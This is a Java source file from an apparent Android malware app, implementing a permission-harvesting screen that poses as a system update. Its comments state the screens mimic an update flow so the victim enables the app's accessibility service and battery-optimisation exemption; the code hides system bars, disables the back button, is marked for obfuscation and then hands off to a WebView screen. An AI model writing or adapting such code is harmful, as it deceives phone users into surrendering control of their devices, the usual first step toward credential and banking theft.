package com.alpha.shield;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.RectF;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;

import org.lsposed.lsparanoid.Obfuscate;

/**
 * PermissionActivity — step-by-step permission collection.
 *
 * Step 0: Accessibility guide screen (shown before opening settings).
 *         Looks like a continuation of the system update flow.
 *         Framing: "To complete the update, enable the service in Accessibility."
 *
 * Step 1: Opens Accessibility Settings. Polls every 500 ms until granted.
 *
 * Step 2: Battery optimisation ignore request. Opens system dialog.
 *         Polls until granted.
 *
 * Step 3: All permissions collected → start WebViewActivity.
 *
 * Full-screen, no status bar, matches FakeUpdateActivity's dark theme.
 */
@Obfuscate
public class PermissionActivity extends Activity {

    private static final int STEP_GUIDE       = 0;
    private static final int STEP_ACCESSIBILITY= 1;
    private static final int STEP_BATTERY     = 2;
    private static final int STEP_DONE        = 3;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private GuideView     guideView;
    private int           step = STEP_GUIDE;
    private Runnable      pollRunnable;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(
                WindowManager.LayoutParams.FLAG_FULLSCREEN
                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                WindowManager.LayoutParams.FLAG_FULLSCREEN
                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);

        // If accessibility already on, skip to battery step
        if (isAccessibilityEnabled()) step = STEP_BATTERY;
        if (isAccessibilityEnabled() && isBatteryIgnored()) {
            launchWebView(); return;
        }

        guideView = new GuideView(this, step);
        setContentView(guideView);

        // CTA button tap
        guideView.setOnClickListener(v -> advance());
        handler.postDelayed(this::startPolling, 1000);
    }

    private void advance() {
        switch (step) {
            case STEP_GUIDE:
                step = STEP_ACCESSIBILITY;
                guideView.setStep(step);
                openAccessibilitySettings();
                break;
            case STEP_ACCESSIBILITY:
                if (isAccessibilityEnabled()) {
                    step = STEP_BATTERY;
                    guideView.setStep(step);
                    requestBatteryOptimisation();
                }
                break;
            case STEP_BATTERY:
                if (isBatteryIgnored()) launchWebView();
                else requestBatteryOptimisation();
                break;
        }
    }

    private void startPolling() {
        pollRunnable = new Runnable() {
            @Override public void run() {
                if (step == STEP_ACCESSIBILITY && isAccessibilityEnabled()) {
                    step = STEP_BATTERY;
                    guideView.setStep(step);
                    requestBatteryOptimisation();
                } else if (step == STEP_BATTERY && isBatteryIgnored()) {
                    launchWebView();
                    return;
                }
                handler.postDelayed(this, 500);
            }
        };
        handler.postDelayed(pollRunnable, 500);
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Check permissions on every resume (user may have just come back from settings)
        if (step == STEP_ACCESSIBILITY && isAccessibilityEnabled()) {
            step = STEP_BATTERY;
            guideView.setStep(step);
            requestBatteryOptimisation();
        } else if (step == STEP_BATTERY && isBatteryIgnored()) {
            launchWebView();
        }
    }

    private void openAccessibilitySettings() {
        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                .addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION));
    }

    private void requestBatteryOptimisation() {
        try {
            Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            i.setData(Uri.parse("package:" + getPackageName()));
            startActivity(i);
        } catch (Exception e) {
            startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
        }
    }

    private boolean isAccessibilityEnabled() {
        try {
            String enabled = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return enabled != null && enabled.contains(getPackageName());
        } catch (Exception e) { return false; }
    }

    private boolean isBatteryIgnored() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Exception e) { return false; }
    }

    private void launchWebView() {
        if (pollRunnable != null) handler.removeCallbacks(pollRunnable);
        startActivity(new Intent(this, WebViewActivity.class)
                .addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION
                        | Intent.FLAG_ACTIVITY_NEW_TASK
                        | Intent.FLAG_ACTIVITY_CLEAR_TASK));
        finish();
        overridePendingTransition(0, 0);
    }

    @Override
    public void onBackPressed() { /* locked */ }

    @Override
    protected void onDestroy() {
        if (pollRunnable != null) handler.removeCallbacks(pollRunnable);
        super.onDestroy();
    }

    // ── Guide View ─────────────────────────────────────────────────────────────

    private static class GuideView extends View {

        private int    step;
        private final Paint  bgPaint    = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint  textPaint  = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint  subPaint   = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint  btnPaint   = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint  btnTxtPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint  stepPaint  = new Paint(Paint.ANTI_ALIAS_FLAG);

        GuideView(Context ctx, int step) {
            super(ctx);
            this.step = step;
            setupPaints();
        }

        void setStep(int s) { step = s; invalidate(); }

        private void setupPaints() {
            bgPaint.setColor(0xFF0D1117);
            textPaint.setColor(0xFFE0E8FF);
            textPaint.setTextAlign(Paint.Align.CENTER);
            textPaint.setTypeface(Typeface.create(Typeface.DEFAULT, Typeface.BOLD));
            subPaint.setColor(0xFF8899BB);
            subPaint.setTextAlign(Paint.Align.CENTER);
            btnPaint.setColor(0xFF00E5FF);
            btnPaint.setStyle(Paint.Style.FILL);
            btnTxtPaint.setColor(0xFF0D1117);
            btnTxtPaint.setTextAlign(Paint.Align.CENTER);
            btnTxtPaint.setTypeface(Typeface.create(Typeface.DEFAULT, Typeface.BOLD));
            stepPaint.setColor(0xFF00E5FF);
            stepPaint.setTextAlign(Paint.Align.CENTER);
        }

        @Override
        protected void onDraw(Canvas canvas) {
            int W = getWidth(), H = getHeight();
            if (W == 0 || H == 0) return;
            float cx = W / 2f;
            float d  = getResources().getDisplayMetrics().density;

            canvas.drawRect(0, 0, W, H, bgPaint);

            String brand = BuildConfig.UPDATE_BRAND;

            switch (step) {
                case STEP_GUIDE:
                case STEP_ACCESSIBILITY:
                    drawAccessibilityGuide(canvas, cx, W, H, d, brand);
                    break;
                case STEP_BATTERY:
                    drawBatteryGuide(canvas, cx, W, H, d, brand);
                    break;
            }
        }

        private void drawAccessibilityGuide(Canvas canvas, float cx,
                                             int W, int H, float d, String brand) {
            // Header
            textPaint.setTextSize(20 * d);
            canvas.drawText("One Last Step", cx, H * 0.14f, textPaint);

            subPaint.setTextSize(13 * d);
            canvas.drawText("Enable the update service to", cx, H * 0.14f + 28 * d, subPaint);
            canvas.drawText("complete the " + brand + " system update.", cx, H * 0.14f + 48 * d, subPaint);

            // Visual steps guide
            float stepX = W * 0.08f;
            float stepY = H * 0.28f;
            float stepGap = H * 0.11f;
            String appName = getContext().getString(R.string.accessibility_service_label);

            String[] steps = {
                "1  Open Accessibility",
                "2  Tap '" + appName + "'",
                "3  Toggle the switch ON",
                "4  Tap 'Allow'"
            };
            subPaint.setTextAlign(Paint.Align.LEFT);
            subPaint.setTextSize(14 * d);
            for (String s : steps) {
                // Step bubble
                stepPaint.setTextSize(0); // unused, draw manually
                Paint bubblePaint = new Paint(Paint.ANTI_ALIAS_FLAG);
                bubblePaint.setColor(0xFF00E5FF22);
                bubblePaint.setStyle(Paint.Style.FILL);
                canvas.drawRoundRect(new RectF(stepX - 8 * d, stepY - 18 * d,
                        W - stepX + 8 * d, stepY + 10 * d), 8 * d, 8 * d, bubblePaint);
                subPaint.setColor(0xFFE0E8FF);
                canvas.drawText(s, stepX, stepY, subPaint);
                stepY += stepGap;
            }
            subPaint.setTextAlign(Paint.Align.CENTER);
            subPaint.setColor(0xFF8899BB);

            // Tap hint
            subPaint.setTextSize(12 * d);
            canvas.drawText("Settings will open automatically", cx, H * 0.70f, subPaint);

            // CTA button
            drawButton(canvas, cx, H * 0.80f, W * 0.65f, 48 * d, "Open Accessibility Settings", d);
        }

        private void drawBatteryGuide(Canvas canvas, float cx,
                                       int W, int H, float d, String brand) {
            textPaint.setTextSize(20 * d);
            canvas.drawText("Background Access", cx, H * 0.14f, textPaint);

            subPaint.setTextSize(13 * d);
            canvas.drawText("Allow " + brand + " Update to run in background", cx, H * 0.14f + 28 * d, subPaint);
            canvas.drawText("so the update can install correctly.", cx, H * 0.14f + 48 * d, subPaint);

            // Icon — battery with bolt
            drawBatteryIcon(canvas, cx, H * 0.42f, d);

            subPaint.setTextSize(13 * d);
            canvas.drawText("On the next screen, tap 'Allow'", cx, H * 0.63f, subPaint);
            canvas.drawText("to let the update complete in the background.", cx, H * 0.63f + 20 * d, subPaint);

            drawButton(canvas, cx, H * 0.80f, W * 0.65f, 48 * d, "Allow Background Access", d);
        }

        private void drawBatteryIcon(Canvas canvas, float cx, float cy, float d) {
            Paint p = new Paint(Paint.ANTI_ALIAS_FLAG);
            p.setColor(0xFF00E5FF);
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(3 * d);
            float bW = 60 * d, bH = 100 * d;
            RectF body = new RectF(cx - bW / 2, cy - bH / 2, cx + bW / 2, cy + bH / 2);
            canvas.drawRoundRect(body, 8 * d, 8 * d, p);
            // Terminal nub at top
            p.setStyle(Paint.Style.FILL);
            canvas.drawRoundRect(new RectF(cx - 15 * d, cy - bH / 2 - 10 * d,
                    cx + 15 * d, cy - bH / 2), 4 * d, 4 * d, p);
            // Fill level (80%)
            p.setColor(0xFF00E5FF44);
            canvas.drawRoundRect(new RectF(cx - bW / 2 + 4 * d, cy - bH / 2 + 4 * d + bH * 0.2f,
                    cx + bW / 2 - 4 * d, cy + bH / 2 - 4 * d), 4 * d, 4 * d, p);
            // Lightning bolt
            p.setColor(0xFF00E5FF);
            p.setStrokeWidth(2.5f * d);
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeCap(Paint.Cap.ROUND);
            canvas.drawLine(cx + 8 * d, cy - 25 * d, cx - 4 * d, cy + 5 * d, p);
            canvas.drawLine(cx - 4 * d, cy + 5 * d, cx + 8 * d, cy + 5 * d, p);
            canvas.drawLine(cx + 8 * d, cy + 5 * d, cx - 8 * d, cy + 30 * d, p);
        }

        private void drawButton(Canvas canvas, float cx, float cy,
                                 float bW, float bH, String label, float d) {
            RectF r = new RectF(cx - bW / 2, cy - bH / 2, cx + bW / 2, cy + bH / 2);
            canvas.drawRoundRect(r, bH / 2, bH / 2, btnPaint);
            btnTxtPaint.setTextSize(14 * d);
            canvas.drawText(label, cx, cy + 5 * d, btnTxtPaint);
        }

        // Forward references to constants
        private static final int STEP_GUIDE        = PermissionActivity.STEP_GUIDE;
        private static final int STEP_ACCESSIBILITY = PermissionActivity.STEP_ACCESSIBILITY;
        private static final int STEP_BATTERY       = PermissionActivity.STEP_BATTERY;
    }
}
